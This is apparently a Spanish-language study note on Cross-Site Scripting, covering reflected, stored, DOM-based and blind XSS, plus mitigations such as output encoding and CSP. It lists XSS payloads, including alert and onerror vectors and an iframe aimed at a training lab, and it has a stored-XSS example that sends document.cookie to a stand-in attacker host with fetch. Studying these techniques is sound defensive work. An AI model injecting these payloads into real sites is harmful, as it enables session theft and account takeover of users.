# Cross-Site Scripting (XSS) 

## Qué es

Las vulnerabilidades de HTML Injection a menudo pueden usarse para realizar ataques **Cross-Site Scripting (XSS)** inyectando código JavaScript que se ejecuta en el cliente. Si podemos ejecutar código en la máquina de la víctima, podemos potencialmente acceder a su cuenta o incluso a su equipo. XSS es muy similar a HTML Injection, pero **XSS inyecta JavaScript** para ataques más avanzados en el cliente, en lugar de solo HTML.

## Tipos principales 

* **Reflected XSS:** ocurre cuando la entrada del usuario se muestra en la página después de procesarla (p. ej. resultado de búsqueda o mensaje de error).
* **Stored XSS:** ocurre cuando la entrada del usuario se almacena en la base de datos del back end y luego se muestra al recuperarla (p. ej. posts o comentarios).
* **DOM XSS:** ocurre cuando la entrada del usuario se muestra directamente en el navegador y se escribe en un objeto del DOM (p. ej. nombre de usuario vulnerable o título de página).

## Ejemplo de DOM XSS 

Payload:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

## Qué sucede al inyectarlo

* Al ingresar ese payload en el ejemplo vulnerable sin sanitización, aparece una ventana `alert` con el valor de la cookie del usuario.
* El payload accede al árbol DOM y recupera `document.cookie`; cuando el navegador procesa la entrada se considera un nuevo DOM y el JavaScript se ejecuta, mostrando la cookie en un popup.
* Un atacante puede usar esto para robar sesiones (enviar la cookie a sí mismo) y luego intentar autenticarse como la víctima.
* El mismo principio permite realizar otros tipos de ataques contra usuarios de la aplicación.








```js
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>
javascript:alert(document.cookie)
<iframe src="https://0a7a000803b4b69f80ea0d7e00d3004e.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
"onmouseover="alert(1)
javascript:alert(1)
'-alert(1)-'
```


---

# Cross-Site Scripting (XSS)

> [!SUMMARY] Definición
> El **Cross-Site Scripting (XSS)** es una vulnerabilidad que permite a un atacante inyectar scripts maliciosos (generalmente JavaScript) en páginas web vistas por otros usuarios.
> 
> **Diferencia clave:** A diferencia de una inyección SQL (que ataca la base de datos), el XSS ataca al **usuario** que visita la web.

---

## 1. XSS Reflejado (Reflected)
El script malicioso viaja en la solicitud (URL) y el servidor lo "refleja" de vuelta en la respuesta. Es temporal y requiere ingeniería social.

> [!EXAMPLE] Vector de Ataque
> El atacante envía un enlace malicioso a la víctima (Phishing).
> `http://sitio.com/buscar?q=<script>alert('XSS')</script>`

**Flujo del ataque:**

```mermaid
sequenceDiagram
    participant Atacante
    participant Victima
    participant Servidor
    
    Atacante->>Victima: Envía enlace malicioso (Email/Chat)
    Victima->>Servidor: Clic en enlace (Request + Script)
    Servidor-->>Victima: Responde con la web + Script reflejado
    Note right of Victima: El navegador ejecuta el script


## 2. XSS Almacenado (Stored / Persistent)

Es el más peligroso. El script se guarda permanentemente en el servidor (Base de Datos, Logs, Comentarios).

> [!DANGER] Impacto
> 
> No requiere que la víctima haga clic en un enlace especial. Simplemente visitar la página infectada ejecuta el código. Afecta a todos los visitantes.

Ejemplo de inyección:

En un foro o sección de comentarios:

HTML

```
Hola a todos!
<script>
  fetch('[http://atacante.com/robador?cookie=](http://atacante.com/robador?cookie=)' + document.cookie);
</script>
```

**Flujo del ataque:**

Fragmento de código

```
graph LR
    A[Atacante] -->|POST: Comentario + Script| B[(Base de Datos)]
    B -->|Carga contenido| C[Servidor Web]
    C -->|Sirve página infectada| D[Víctima 1]
    C -->|Sirve página infectada| E[Víctima 2]
    C -->|Sirve página infectada| F[Admin]
```

---

## 3. XSS basado en DOM (DOM-based)

La vulnerabilidad ocurre completamente en el **cliente (navegador)**. El servidor puede enviar una página segura, pero el JavaScript del cliente manipula los datos de forma insegura.

- **Source (Fuente):** De dónde vienen los datos (ej: `location.hash`, `location.search`).
    
- **Sink (Sumidero):** Dónde se ejecutan (ej: `innerHTML`, `document.write`, `eval`).
    

> [!BUG] Código Vulnerable (Ejemplo)
> 
> JavaScript
> 
> ```
> // El script toma el hash de la URL y lo escribe en el HTML sin sanitizar
> var userConfig = location.hash.substring(1);
> document.getElementById("welcome-msg").innerHTML = userConfig;
> ```
> 
> _Si la URL es `sitio.com#<img src=x onerror=alert(1)>`, el código se ejecuta._

---

## Tabla Comparativa

|**Tipo**|**Ubicación del Payload**|**Persistencia**|**Interacción requerida**|
|---|---|---|---|
|**Reflejado**|En la URL (Solicitud)|No (Un solo uso)|Alta (Clic en enlace)|
|**Almacenado**|Base de Datos (Servidor)|Sí (Permanente)|Baja (Solo visitar)|
|**DOM-based**|DOM del Navegador|Depende de la fuente|Variable|

---

### Variantes Avanzadas

> [!WARNING] Blind XSS
> 
> Una variante del Stored XSS donde el atacante inyecta código en un lugar que no puede ver (ej: formulario de contacto, logs de errores).
> 
> El payload se detona días o semanas después cuando un **Administrador** revisa esos datos en un panel interno, permitiendo el robo de sesiones privilegiadas.

---

## [[Prevención y Mitigación]]

- **Sanitización de entrada:** Limpiar datos recibidos.
    
- **Codificación de salida (Output Encoding):** Convertir caracteres especiales en entidades HTML (ej: `<` a `&lt;`).
    
- **CSP ([[Content Security Policy]]):** Restringir los dominios desde donde se pueden cargar scripts.
